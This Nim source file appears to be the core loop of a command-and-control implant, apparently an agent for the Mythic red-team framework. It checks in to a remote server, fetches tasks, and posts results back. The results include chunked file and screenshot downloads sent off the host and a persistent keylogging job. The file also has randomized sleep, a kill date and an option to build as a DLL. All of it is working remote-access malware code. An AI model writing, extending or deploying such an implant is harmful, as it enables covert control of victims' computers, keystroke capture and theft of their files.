import algorithm
import asyncdispatch
import base64
import json
from strutils import split
import ../utils/http
import ../utils/checkin
import ../utils/config
import ../utils/job
import ../utils/task

import ../utils/debug

var curConfig = createConfig()
var runningJobs: seq[Job]

proc error*(message: string, exception: ref Exception) =
    echo message
    echo exception.getStackTrace()

proc getTasks* : Future[seq[Task]] {.async.} = 
    var tasks: seq[Task]
    let taskJson = %*{"action" : "get_tasking", "tasking_size": -1 }
    debugMsg("Attempting to get tasks")
    let data = when defined(AESPSK): $(taskJson) else: encode(curConfig.PayloadUUID & $(taskJson), true) 
    debugMsg("attempting to get tasks with this data: " & data)
    let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
    debugMsg("decoded temp: " & temp)
    if(cmp(temp[0 .. 35], curConfig.PayloadUUID) != 0):
        debugMsg("Payload UUID do not match when fetching tasks something is wrong...")
        return tasks
    # https://nim-lang.org/docs/system.html#%5E.t%2Cint
    var resp = parseJson(temp[36 .. ^1])
    for jnode in getElems(resp["tasks"]):
        debugMsg("Jnode: ", jnode)
        tasks.add(Task(action: jnode["command"].getStr(), id: jnode["id"].getStr(), parameters: jnode["parameters"].getStr(), timestamp: jnode["timestamp"].getFloat()))
    # Sort by tasks' timestamps to get most recent tasks 
    tasks.sort(taskCmp)
    result = tasks
    debugMsg("Sorted result: " & $(result))


proc checkIn: Future[bool] {.async.} = 
    var check = createCheckIn(curConfig)
    debugMsg("Checkin has been created: ", $(check))

    let data = when defined(AESPSK): checkintojson(check) else: encode(curConfig.PayloadUUID & checkintojson(check), true)
    try:
        # Send initial checkin and parse json response into JsonNode
        let temp = when defined(AESPSK): await Fetch(curConfig, data, true) else: decode(await Fetch(curConfig, data, true))
        debugMsg("decoded temp: " & $(temp))
        debugMsg("len temp: ", len(temp))
        var resp = parseJson(temp[36 .. ^1])
        debugMsg("resp from checkin: " & $(resp))
        if(cmp(resp["status"].getStr(), "success")) == 0:
            curConfig.PayloadUUID = resp["id"].getStr()
            debugMsg("Updated curconfig payloaduuid ", curConfig.PayloadUUID, " to ", resp["id"].getStr())
            result = true
        else:
            result = false
    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        debugMsg("Inside checkIn, got exception ", repr(e), " with message ", msg)
        error("stacktrace", e)
        result = false
        
proc postUp(curConfig: Config, results: seq[Job]): Future[tuple[postupResp: string, resSeq: seq[Job]]] {.async.} =
    var newJobSeq: seq[Job]
    var isDownloadFirst = false
    var taskTable = initTable[string, Job]()
    try:
        if len(results) > 0:
            let respJson = %*{"action" : "post_response", "responses": []}
            for i in 0..len(results)-1:
                let job = results[i]
                if job.Command == "keylog":
                    debugMsg("inside postup adding keylog back to running jobs")
                    newJobSeq.add(job)
                    continue
                debugMsg("Got job: ", $(job))
                var jNode: JsonNode
                if job.Download or job.Screenshot:
                    debugMsg("Inside postUp job is a download job")
                    if len(job.FileId) == 0:
                        debugMsg("length of fileid is 0")
                        jNode = %*
                            {
                                    "total_chunks": job.TotalChunks,
                                    "task_id": job.TaskId,
                                    "full_path": job.Path,
                                    "host": getHostName(),
                                    "is_screenshot": job.Screenshot
                            }
                        # Add this index to indices as we need to parse the result later and then add to resSeq
                        # also need to toggle flag as this is first time downloading need to parse file_id 
                        isDownloadFirst = true
                        taskTable[job.TaskId] = job
                    elif job.ChunkNum == job.TotalChunks:
                        debugMsg("chunknum == totalchunks")
                        jNode = %*
                            {
                                    "total_chunks": job.TotalChunks,
                                    "file_id": job.FileId,
                                    "task_id": job.TaskId,
                                    "full_path": job.Path,
                                    "success": job.Success,
                                    "chunk_num": job.ChunkNum,
                                    "chunk_data": job.Response,
                                    "completed": job.Completed,
                            }
                    else:
                        jNode = %*
                            {
                                    "task_id": job.TaskId,
                                    "chunk_num": job.ChunkNum,
                                    "chunk_data": job.Response,
                                    "success": job.Success,
                                    "full_path": job.Path,
                            }
                        newJobSeq.add(job)
                
                elif job.Upload and (job.TotalChunks != job.ChunkNum):
                        jNode = %*
                            {
                                    "task_id": job.TaskId,
                                    "chunk_num": job.ChunkNum,
                                    "chunk_data": job.Response,
                                    "success": job.Success,
                                    "full_path": job.Path,
                            }
                        newJobSeq.add(job)
                    
                else:
                    jNode = %*
                        {
                            "task_id": job.TaskId,
                            "user_output": job.Response,
                            "success": job.Success,
                            "completed": job.Completed
                        }
                      

                respJson["responses"].add(jNode)
            debugMsg("respJson: ", $(respJson))
            let data = when defined(AESPSK): $(respJson) else: encode(curConfig.PayloadUUID & $(respJson), true)
            let fetchData = await Fetch(curConfig, data, false)
            if isDownloadFirst:
                debugMsg("isdownload first \n")
                    # Indicates json response needs to be parsed for file_id
                debugMsg("your fetchdata: ", $(fetchData))
                    # echo "fetchdata decoded: ", decode(fetchData)
                let parsedJson = when defined(AESPSK): parseJson(fetchData[36 .. ^1]) else: parseJson(decode(fetchData)[36 .. ^1]) 
                debugMsg("parsedJson: ", $(parsedJson))
                for resp in parsedJson["responses"].getElems():
                    # check if taskid is in dictionary if so 
                    # extract file_id value and set it equal to correct Job
                    let jtaskid = resp["task_id"].getStr()
                    if taskTable.hasKey(jtaskid):
                        debugMsg("key has been found in dict: here is resp: ", $(resp))
                        let file_id = resp["file_id"].getStr()
                        var jobValue = taskTable[jtaskid]
                        jobValue.FileId = file_id
                        debugMsg("updated fileid in jobValue, adding it to newJobSeq ", $(jobValue))
                        newJobSeq.add(jobValue)
                    debugMsg("resp: ", $(resp))
            result = (postupResp: fetchData, resSeq: newJobSeq)
        else:
            result = (postupResp: "No new jobs", resSeq: newJobSeq)
    except:
        let
            e = getCurrentException()
            msg = getCurrentExceptionMsg()
        result = (postupResp: "An exception has occurred when attempting to do a request: " & repr(e) & " with message " & msg, resSeq: newJobSeq)


# Determine during compile time if being compiled as a DLL export main proc
when appType == "lib":
  {.pragma: rtl, exportc, dynlib, cdecl.}
else:
  {.pragma: rtl, }

proc main() {.async, rtl.} = 
    while (not await checkin()):
        let dwell = genSleepTime(curConfig)
        debugMsg("checkin is false", "dwell: ", dwell)
        await sleepAsync(dwell)
        debugMsg("Checked in with curConfig of: " & $(curConfig))
    while true:
        if(checkDate(curConfig.KillDate)):
            quit(QuitSuccess)
        let tasks = await getTasks()
        debugMsg("tasks: ", $(tasks))
        debugMsg("inside base and runningJobs: ", $(runningJobs))
        let resJobLauncherTup = await jobLauncher(runningJobs, tasks, curConfig)
        # Update config and obtain runnings jobs
        runningJobs = resJobLauncherTup.jobs
        curConfig = resJobLauncherTup.newConfig

        debugMsg("running jobs from joblauncher: ", $(runningJobs))
        let postResptuple =  await postUp(curConfig, runningJobs)
        debugMsg("jobs returned from postUp: ", $(postResptuple.resSeq))

        runningJobs = postResptuple.resSeq
        debugMsg("runningJobs after setting it equal to postresptuple.resSeq: ", $(runningJobs))
        debugMsg("postResp: ", postResptuple.postupResp)
            
        let dwell = genSleepTime(curConfig)
        await sleepAsync(dwell)

when appType != "lib":
    waitFor main()